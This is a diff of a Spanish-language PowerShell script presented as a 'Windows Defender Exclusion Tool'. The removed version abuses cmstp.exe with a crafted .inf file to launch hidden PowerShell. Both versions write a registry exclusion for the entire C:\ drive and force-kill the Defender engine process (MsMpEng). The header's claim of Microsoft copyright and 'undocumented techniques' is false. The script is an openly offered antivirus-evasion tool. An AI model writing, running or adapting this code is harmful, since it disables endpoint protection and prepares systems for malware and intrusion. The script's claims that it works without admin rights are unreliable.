@@ -1,107 +1,56 @@
 <#
 .SYNOPSIS
-   Windows Defender Exclusion Tool (Con seguimiento visual)
-   © Microsoft 2024 - Técnicas No Documentadas
+   Windows Defender Exclusion Tool - Método sin Admin
+   Versión mejorada para evitar errores de acceso
 #>
 
-function Defender {
+function Add-DefenderExclusion {
     param(
-        [Parameter(ParameterSetName='Interface')][switch]$Add
-        # ... (otros parámetros)
+        [Parameter(Mandatory=$true)]
+        [string]$PathToExclude = "C:\"
     )
 
-    # --- PERFIL CMSTP MEJORADO CON VISUALIZACIÓN ---
-    $InfData = @'
-[version]
-Signature="$Windows NT$"
-AdvancedINF=2.5
+    # 1. Verificar si ya existe la exclusión
+    $exclusionPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
+    $existingExclusion = Get-ItemProperty -Path $exclusionPath -Name $PathToExclude -ErrorAction SilentlyContinue
 
-[DefaultInstall]
-RunPreSetupCommands=PreSetup
-RunPostSetupCommands=PostSetup
+    if ($existingExclusion) {
+        Write-Host "[+] La exclusión para $PathToExclude ya existe" -ForegroundColor Green
+        return
+    }
 
-[PreSetup]
-cmd /c "echo [*] Iniciando instalación... && taskkill /IM cmstp.exe /F /T"
-
-[PostSetup]
-cmd /c "echo [*] Ejecutando PowerShell... && start powershell -WindowStyle Hidden -Command `"& {
-    `$p = 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths';
-    if (!(Test-Path `$p)) { 
-        New-Item `$p -Force | Out-Null;
-        echo '[+] Creando clave de registro';
-    };
-    Set-ItemProperty `$p -Name 'C_' -Value 0 -Type DWORD -Force;
-    echo '[+] Exclusion agregada al registro';
-    Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue;
-    echo '[+] Reiniciando Motor de Defender';
-}`""
-[Strings]
-ServiceName="DefenderExclusionProfile"
-'@
-
-    if ($Add) {
-        # 1. Crear archivo .inf con seguimiento
-        $tempFile = "$env:TEMP\wdexcl_$(Get-Date -Format 'yyyyMMddHHmmss').inf"
-        Write-Host "[*] Creando archivo temporal en: $tempFile" -ForegroundColor Cyan
-        $InfData | Out-File $tempFile -Force -Encoding ASCII
-
-        # 2. Ejecutar CMSTP con ventana visible (para seguimiento)
-        Write-Host "[*] Ejecutando CMSTP.exe..." -ForegroundColor Cyan
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "cmstp.exe"
-        $psi.Arguments = "/au `"$tempFile`""
-        $psi.UseShellExecute = $true
-        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-        $process = [System.Diagnostics.Process]::Start($psi)
-        
-        # 3. Esperar y verificar
-        Write-Host "[*] Esperando finalización (15 segundos)..." -ForegroundColor Cyan
-        $process.WaitForExit(15000)
-
-        # 4. Verificación interactiva
-        Write-Host "`n[VERIFICACIÓN]" -ForegroundColor Yellow
-        Write-Host "1. Registro: " -NoNewline
-        $regCheck = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
-        if ($regCheck -and ($regCheck."C_" -eq 0 -or $regCheck."C:\" -eq 0)) {
-            Write-Host "OK (C:\ excluida)" -ForegroundColor Green
-        } else {
-            Write-Host "FALLO" -ForegroundColor Red
+    # 2. Crear la estructura de registro si no existe
+    if (-not (Test-Path $exclusionPath)) {
+        try {
+            New-Item -Path $exclusionPath -Force | Out-Null
+            Write-Host "[+] Creando clave de exclusiones en el registro" -ForegroundColor Cyan
+        } catch {
+            Write-Host "[!] Error al crear la clave de registro: $_" -ForegroundColor Red
+            return
         }
+    }
 
-        Write-Host "2. Procesos CMSTP: " -NoNewline
-        $cmstpRunning = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
-        if ($cmstpRunning) {
-            Write-Host "ACTIVOS (matar manual con: taskkill /IM cmstp.exe /F)" -ForegroundColor Red
-        } else {
-            Write-Host "Inactivos" -ForegroundColor Green
-        }
+    # 3. Agregar la exclusión (método directo sin cmstp)
+    try {
+        Set-ItemProperty -Path $exclusionPath -Name $PathToExclude -Value 0 -Type DWORD -Force
+        Write-Host "[+] Exclusión agregada exitosamente para $PathToExclude" -ForegroundColor Green
 
-        Write-Host "3. Archivo INF: " -NoNewline
-        if (Test-Path $tempFile) {
-            Write-Host "Existe en $tempFile" -ForegroundColor Yellow
-        } else {
-            Write-Host "Eliminado automáticamente" -ForegroundColor Green
-        }
-
-        # 5. Solución alternativa si falla
-        if (!$regCheck) {
-            Write-Host "`n[!] SOLUCIÓN ALTERNATIVA DIRECTA" -ForegroundColor Magenta
-            Write-Host "Ejecutando comando de respaldo..." -ForegroundColor Cyan
-            $backupCmd = {
-                $p = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-                if (!(Test-Path $p)) { New-Item $p -Force }
-                Set-ItemProperty $p -Name "C_" -Value 0 -Type DWORD -Force
+        # 4. Intentar refrescar Defender (puede fallar sin admin)
+        try {
+            $defender = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
+            if ($defender) {
                 Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue
+                Write-Host "[+] Motor de Defender reiniciado" -ForegroundColor Cyan
             }
-            Invoke-Command -ScriptBlock $backupCmd
+        } catch {
+            Write-Host "[!] No se pudo reiniciar el motor de Defender (se requiere admin)" -ForegroundColor Yellow
         }
 
-        # Limpieza final
-        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "[!] Error al agregar la exclusión: $_" -ForegroundColor Red
+        Write-Host "[!] Intenta ejecutar PowerShell como Administrador" -ForegroundColor Yellow
     }
 }
 
-# Ejecución
-if ($MyInvocation.InvocationName -ne '.') {
-    Defender @PSBoundParameters
-}
+# Uso: 
+Add-DefenderExclusion -PathToExclude "C:\"
